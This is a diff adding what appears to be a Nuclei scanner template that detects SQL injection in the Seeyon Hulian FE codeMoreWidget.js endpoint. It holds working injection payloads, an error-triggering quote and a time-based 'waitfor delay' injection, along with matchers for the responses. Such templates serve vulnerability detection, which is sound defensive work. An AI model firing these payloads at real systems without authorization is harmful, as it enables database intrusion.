@@ -1,0 +1,46 @@
+id: seeyon-hulian-codeMoreWidget-sqli
+info:
+  name: Seeyon Hulian FE codeMoreWidget.js SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1)+2}}"
+
+http:
+  - raw:
+      - |
+        POST /common/codeMoreWidget.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        code=-1'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "sqlserver.jdbc.SQLServerException"
+          - "bad SQL"
+
+  - raw:
+      - |
+        POST /common/codeMoreWidget.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        code=-1';waitfor delay '0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "response_time >= {{t1}}000"
+          - "response_time <= {{t2}}000"
